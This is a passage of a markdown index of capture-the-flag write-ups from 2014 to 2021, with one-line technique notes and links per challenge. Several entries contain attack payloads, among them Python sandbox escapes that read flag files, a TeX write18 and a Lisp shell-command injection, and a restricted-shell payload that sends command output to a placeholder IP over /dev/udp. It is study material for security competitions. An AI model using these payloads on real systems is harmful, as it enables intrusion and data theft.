    https://github.com/ctfs/write-ups-2016/tree/master/asis-ctf-2016/forensic/p1ng-121

### television - backdoor-ctf-2016
    xor image i with image i+1, then xor resulting image with i+2 and so on
    https://github.com/p4-team/ctf/blob/master/2016-06-04-backdoor-ctf/stegano_television/README.md

### lossless - backdoor-ctf-2016
    compare original.png encrypted.png diff.png -> images differ only in the top right corne
    or use https://futureboy.us/stegano/compinput.html to enhance clarity
    49x7 binary matrix, strings with blue=1 and black=0, 7 rows -> 1 ascii char per column
    http://www.codilime.com/backdoorctf16-lossless/

### brainfun - csaw-ctf-2016
    the alpha values are in the printable ascii range
    rearrange the pixel values by RGB value, using the key red<<8 + green<<4 + blue, produces brainfuck code
    use pybrainfuck to decode flag
    https://gist.github.com/Lense/a8e94e96f886cb773f646b8aaea806fc

### ninth - mma-ctf-2016
    flag is in additional compressed data in each IDAT chunk
    https://codisec.com/tw-mma-2-2016-ninth/

</p></details>
<!-- }}} -->
<!-- }}} -->

## exploit <!-- {{{ -->
<!-- 2014-2016 {{{ -->
<details><summary>2014-2016</summary><p>

### python sandbox/jail escapes
    http://gynvael.coldwind.pl/n/python_sandbox_escape
    print(().__class__.__bases__[0].__subclasses__()[40]('./key').read()) (pybabbies - csaw-ctf-2014)
    {}.__class__.__base__.__subclasses__()[40]("/home/john/flag.txt").read() (exploit300 - volga-ctf-quals-2014)
    http://tasteless.eu/post/2014/01/phd-ctf-quals-2014-pyjail/
    http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/

### 4stone-doraemon - codegate-preliminary-2014
    disable aslr with ulimit -s unlimited
    gdb trick to find location of tls block (to overwrite location of kernel_vsyscall)
    shellcode in env with shortjumps (\xeb\02) to jump over env var key and equal sign
    trampoline to env found in libc (no longer randomized)
    https://github.com/maraud3rs/writeups/tree/master/codegate_4stone

### angrey-doraemon - codegate-preliminary-2014
    stack overflow with canary bypass (leak)
    http://v0ids3curity.blogspot.com.au/2014/02/codegate-ctf-quals-2014-angry-doraemon.html

### minibomb - codegate-preliminary-2014
    rop to call execve
    set eax via filling socket (write call returns actual byte count written)
    set ebx via gadget that sys_read from fd=1 (our socket)
    ecx is our argv
    http://mslc.ctf.su/wp/codegate-2014-quals-minibomb-pwn-400/

### gynophage 4 - defcon-ctf-quals-2014
    shellcode polyglot (x86, ppc, armel, armeb)
    https://github.com/ctfs/write-ups-2014/tree/master/def-con-ctf-qualifier-2014/polyglot

### nibble - nuitduhack-ctf-quals-2014
    pop + plt overwrite
    http://blog.dragonsector.pl/2014/04/nuit-du-hack-ctf-quals-2014-nibble.html

### ezhp - plaid-ctf-2014
    heap overflow
    https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug
    http://danuxx.blogspot.ch/2014/04/plaidctf-2014-ezhp-heap-overflow.html
    while :;do nc -lnvp 4444 -e ./ezhp;done
    socat tcp-listen:4444,fork exec:./ezph

### remote print - internetwache-ctf-2016
    format string
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/exploit/remote-printer-80

### equationsolver - internetwache-ctf-2016
    integer overlow
    http://poning.me/2016/03/04/equationsolver/ they used z3 to solve this one
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/exploit/equationsolver-60

### secure file reader - nuitduhack-quals-2016
    rop and race condition
    http://maroueneboubakri.blogspot.com.au/2016/04/nuit-du-hack-quals-secure-file-reader.html

### quine - icectf-2016
    service accepts C code and runs it

</p></details>
<!-- }}} -->
<!-- }}} -->

## reverse <!-- {{{ -->
<!-- 2014-2016 {{{ -->
<details><summary>2014-2016</summary><p>

### chrono logical - codegate-preliminary-2014
    disable timeout in select with setarch -T
    http://www.blue-lotus.net/2014-02-25-codegate-ctf-quals-2014-chrono-writeup/

### reverve100 - volga-ctf-quals-2014
    maze solved with btree algo
    http://singularityctf.blogspot.com.au/2014/03/volgactf-quals-2014-writeup-reverse-100.html

### exploit100 - volga-ctf-quals-2014
    password value enumeration

### big momma - nuitduhack-ctf-quals-2014
    username/password enumeration
    server returns strcmp return value between our input and the correct username

### file checker = internetwache-ctf-2016
    great use of angr (https://github.com/angr/angr-doc/blob/master/examples.md)
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/reversing/file-checker-60

### peoples square - 0ctf-2016
    attack on aes with 4 rounds instead of 10
    https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/peoples_square

### matriochka - nuitduhack-quals-2016
    boot vm on gparted iso to copy mbr to disk, then remote gdb of vmware vm
    https://securite.intrinsec.com/2016/04/03/write-up-nuit-du-hack-2016-ctf-quals-matriochka-step-4/

</p></details>
<!-- }}} -->
<!-- }}} -->

## misc <!-- {{{ -->
<!-- 2014-2021 {{{ -->
<details><summary>2014-2021</summary><p>

### gunslinger - hacklu-ctf-2014
    restricted bash shell (no alpha chars allowed)
    bypass with encoding cat in octal: $'\143\141\164'
    https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/gunslinger-joes-private-terminal

### binary karuta - seccon-ctf-2014
    solution by building and training a Naive Bayes Classifier
    https://github.com/ctfs/write-ups-2014/tree/master/seccon-ctf-2014/binary-karuta

### bar codes - internetwache-ctf-2016
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/misc/barparty-90

### dark forest - internetwache-ctf-2016
    binary tree
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/code/dark-forest-90

### texmaker - internetwache-ctf-2016
    web interface creates pdf files using pdfTeX
    in TeX we can RCE with operation \immediate\write18{ls}
    another way was to just include the flag file, there many ways to do this
    https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/web/texmaker-90
    https://0day.work/hacking-with-latex/

### hsab - bctf-2016
    restricted bash shell with no binaries but with ctypes.sh of Taviso (builtins=([0]="callback" [1]="dlcall" etc. in set's output)
    solution alternative: history -r /home/ctf/flag.ray; history
    https://ctf.rip/bctf-2016-hsab-misc-category-challenge/
    https://github.com/QuokkaLight/write-ups/blob/master/bctf-2016/hsab.md (pow in C)

### smartcat3 - insomnihack-ctf-2016
    rce but can't do spaces or some specials
    <(ls>/dev/udp/1.2.3.4/53)
    <({base64,-d,KGVjaG8gIkdpdmUgbWUgYS4uLiI7IHNsZWVwIDI7IGVjaG8gIi4uLiBmbGFnISIpIHwgL3JlYWRfZmxhZyBmbGFn}>/tmp/t.sh
    <({bash,/tmp/t.sh}>/dev/udp/1.2.3.4/53)
    https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/misc/Smartcat3
    https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/web_smartcat3 (read_flag in python)

### amazing - volga-ctf-quals-2016
    maze btree
    https://github.com/EspacioTeam/write-ups/blob/master/2016/volga/Amazing/README.md

### yacst2 - volga-ctf-quals-2016
    solved audio captcha with google speach recognition
    https://github.com/p4-team/ctf/tree/master/2016-03-26-volga2016-quals/yacs2

### unblink - sctf-2016
    decode msg from LEDs
    https://0x90r00t.com/2016/04/17/sctf-2016-code-100-unblink-write-up/

### misc robots - insomnihack-ctf-2016
    lisp program, rce by submitting: #.(run-shell-command "ls")
    https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/misc_robots

### smartips - insomnihack-ctf-2016
    simple shell command injection but server sends RST, ACK which we need to drop to be able to continue communication
    iptables -A INPUT -p TCP --tcp-flags ALL RST,ACK -s 10.13.39.30 -j DROP
    https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Smartips

### hackvent-2015
    lots of qr codes
    https://github.com/shiltemann/CTF-writeups-public/blob/master/Hackvent_2015/writeup.md

### regexpire - csaw-ctf-2016
    solve regexes
    https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/regexpire

### yaar haar fiddle dee dee - csaw-ctf-2016
    opencv haar cascade
    https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Dee

### smartips - insomnihack-ctf-2016
    server continues communication even after sending us RST ACK so drop them with
    iptables -A INPUT -p TCP --tcp-flags ALL RST,ACK -s 10.13.39.30 -j DROP
    https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Smartips

### jareCaptcha - sharif-ctf-2016
    sudoku solver and captcha bypass (reuse same captcha cookie id)
    https://github.com/p4-team/ctf/blob/master/2016-12-16-sharifctf7/web_200_jareCaptcha/README.md

### old schoold - kaspersky-ctf-2017
    NES game, use FCEUX emulator to debug and patch
    http://www.codehead.co.uk/klctf2017-oldschool/

### weird message - angstromctf-2018
    encoded in punycode (xn--), write loop to decode and replace unicode characters
    https://www.id0.one/blog/content/3.bp.html

### bashell - alles-ctf-2020
    bash commands with only `[]$<\_`
    https://github.com/benjaminjkraft/junk/blob/master/bashell.py

### committee - union-ctf-2021
    recover flag from git commit hash
    https://mystiz.hk/posts/2021-02-27-union-ctf-committee/

</p></details>
<!-- }}} -->
<!-- }}} -->

## todo <!-- {{{ -->
<details><summary>list</summary><p>

* [x] pico-ctf-2013
* [x] boston-key-party-2014
* [x] codegate-preliminary-2014
* [x] confidence-ctf-teaser-2014
* [x] d-ctf-2014
* [x] asis-ctf-quals-2014
* [x] 9447-ctf-2014
* [x] 31c3-ctf-2014
* [x] defcon-ctf-quals-2014
* [x] ectf-2014
* [x] ghost-in-the-shellcode-2014
* [x] hacklu-ctf-2014
* [x] hackyou-2014
* [x] hitcon-ctf-2014
* [x] ncn-ctf-2014
* [x] ncn-ctf-quals-2014
* [x] olympic-ctf-2014
* [x] phdays-2014-{quals,finals}
* [x] pwnium-ctf-2014
* [x] qiwi-ctf-2014
* [x] ructf-2014-quals
* [x] seccon-ctf-2014
* [x] secuinside-ctf-quals-2014
* [x] 0ctf-2015
* [x] 32c3-ctf-2015 itd pas compris
* [x] 9447-ctf-2015 ffmpeg 0day https://news.ycombinator.com/item?id=10893301 http://seclists.org/oss-sec/2016/q1/91
* [x] asis-finals-ctf-2015
* [x] asis-quals-ctf-2015
* [x] backdoor-ctf-2015 javascript and clojure sandbox escapes
* [x] bctf-2015
* [x] boston-key-party-2015
* [x] breakin-ctf-2015
* [x] bsides-vancouver-ctf-2015
* [x] camp-ctf-2015
* [x] codegate-ctf-2015
* [x] confidence-ctf-teaser-2015
* [x] csaw-ctf-2015
* [x] csaw-finals-ctf-2015
* [x] cyber-security-challenge-2015
* [x] dctf-2015
* [x] defcon-quals-2015 todo
* [x] easy-ctf-2015 do the exploits
* [x] ekoparty-ctf-2015
* [x] ekoparty-pre-ctf-2015
* [x] ghost-in-the-shellcode-2015
* [x] hack-dat-kiwi-ctf-2015
* [x] hacklu-ctf-2015
* [x] hackcon-2015
* [x] hackover-ctf-2015
* [x] haxdump-ctf-2015
* [x] hitcon-ctf-quals-2015
* [x] icectf-2015
* [x] insomnihack-2015 no writeups but sources at https://github.com/Insomnihack/Insomnihack-2015
* [x] mma-ctf-2015
* [x] nuitduhack-ctf-quals-2015
* [x] nullcom-hackim-2015
* [x] opentoall-ctf-2015
* [x] plaid-ctf-2015
* [x] poli-ctf-2015
* [x] pragyan-ctf-2015
* [x] rctf-quals-2015 no writeups
* [x] ructfe-ad-2015 no writeups
* [x] sctf-2015
* [x] school-ctf-2015 no eng writeups
* [x] school-ctf-winter-2015
* [x] seccon-quals-ctf-2015
* [x] securinets-ctf-2015 many missing writeups
* [x] stem-ctf-2015
* [x] th3jackers-ctf-2015
* [x] thailand-ctf-2015 no writeups
* [x] trend-micro-ctf-2015
* [x] volga-ctf-quals-2015
* [x] 0ctf-2016
* [x] alictf-2016
* [x] angstromctf-2016
* [x] asis-ctf-2016
* [x] asis-ctf-quals-2016
* [x] backdoor-ctf-2016
* [x] bctf-2016
* [x] bioterra-ctf-2016
* [x] blaze-ctf-2016
* [x] boston-key-party-2016
* [x] breakin-ctf-2016
* [x] codegate-ctf-2016
* [x] csaw-ctf-2016
* [x] ctfx-2016
* [x] cyber-security-challenge-belgium-2016
* [x] def-con-ctf-quals-2016 skipped
* [x] defcamp-2016
* [x] ectf-2016
* [x] ekoparty-ctf-2016
* [x] google-ctf-2016
* [x] h4ckit-ctf-2016
* [x] hack-the-vote-ctf-2016
* [x] hack.lu-ctf-2016
* [x] hackover-ctf-2016
* [x] hitb-ctf-amsterdam-2016
* [x] hitcon-ctf-quals-2016
* [x] icectf-2016
* [x] insomnihack-ctf-2016
* [x] insomnihack-teaser-2016
* [x] mma-ctf-2nd-2016
* [x] nuitduhack-quals-2016
* [x] nullcon-hackim-2016
* [x] open-ctf-2016
* [x] pentest-cyprus-2
* [x] plaid-ctf-2016
* [x] pwn2win-ctf-2016
* [x] sctf-2016-q1
* [x] seccon-ctf-quals-2016
* [x] secuinside-ctf-quals-2016
* [x] securinets-ctf-quals-2016
* [x] security-fest-2016
* [x] sharif-ctf-2016
* [x] ssctf-2016
* [x] su-ctf-2016
* [x] teaser-confidence-ctf-2016
* [x] tjctf-2016
* [x] tu-ctf-2016
* [x] tum-ctf-2016
* [x] insomnihack-teaser-2017
* [x] breakin-ctf-2017
* [x] alexctf-2017
* [x] bitsctf-2017
* [x] nullcon-hackim-2017
* [x] bsides-sanfransisco-ctf-2017
* [x] boston-key-party-2017
* [x] 0ctf-2017
* [x] volga-ctf-quals-2017
* [x] insomnihack-ctf-2017
* [x] pico-ctf-2017
* [x] nuitduhack-quals-2017
* [x] asis-ctf-quals-2017
* [x] plaidctf-2017
* [x] uiuctf-2017
* [x] rctf-2017
* [x] sctf-2017
* [x] google-ctf-2017
* [x] secuinside-ctf-quals-2017
* [x] poli-ctf-2017
* [x] meepwn-ctf-2017
* [x] ctfzone-2017
* [x] asis-ctf-2017
* [x] sect-ctf-2017
* [x] csaw-ctf-2017
* [x] ekoparty-ctf-2017
* [x] backdoor-ctf-2017
* [x] defcamp-2017
* [x] hack.lu-ctf-2017
* [x] pwn2win-ctf-2017
* [x] kaspersky-ctf-2017
* [x] hitcon-ctf-quals-2017
* [x] codeblue-ctf-2017
* [x] tu-ctf-2017
* [x] seccon-ctf-2017
* [x] 3dsctf-2017
* [x] 34c3-ctf-2017
* [x] 2018 weight >= 25
* [x] 2019 weight >= 25
* [x] 2020 weight > 25
</p></details>
<!-- }}} -->

## moar <!-- {{{ -->

### write ups

* orangetw https://github.com/orangetw/My-CTF-Web-Challenges
* ppp https://github.com/pwning/public-writeup
* smokeleet https://github.com/smokeleeteveryday/CTF_WRITEUPS
* bo1lers https://github.com/ispoleet/ctf-writeups
* CaptureTheSwag https://ctf.rip/ https://github.com/sourcekris/ctf-solutions
* InternetWache https://0day.work/
* Tasteless http://tasteless.eu/
* LC!BC http://mslc.ctf.su/ More Smoked Leet Chicken (leetmore.ctf.su + smokedchicken.org) (now merged with BalalaikaCr3w as LC!BC)
* BalalaikaCr3w https://ctfcrew.org/
* Fourchette Bombe https://github.com/JulesDT http://0xecute.com/
* khack40 http://khack40.info/
* Raccoons https://github.com/raccoons-team/ctf/
* Eat Sleep Pwn Repeat https://kitctf.de/
* kt (ex SpamAndHex! captain) https://kt.pe/blog/
* The Flat Network Society https://github.com/TFNS/writeups/
* Bug Bounty Writeups https://pentester.land/list-of-bug-bounty-writeups.html https://www.bugbountyhunting.com/ https://github.com/bminossi/AllVideoPocsFromHackerOne
* DerbyCon CTF https://labs.nettitude.com/blog/derbycon-2018-ctf-write-up/)
* justCatTheFish/terjanq https://github.com/terjanq/Flag-Capture
* jorge_ctf https://github.com/jorgectf/Created-CTF-Challenges

### ctf archive

* https://github.com/sajjadium/CTFium/
* https://github.com/utisss/UTCTF-21/

<!-- }}} -->

<!-- vim: ts=4 sw=4 sts=4 et fdm=marker bg=dark
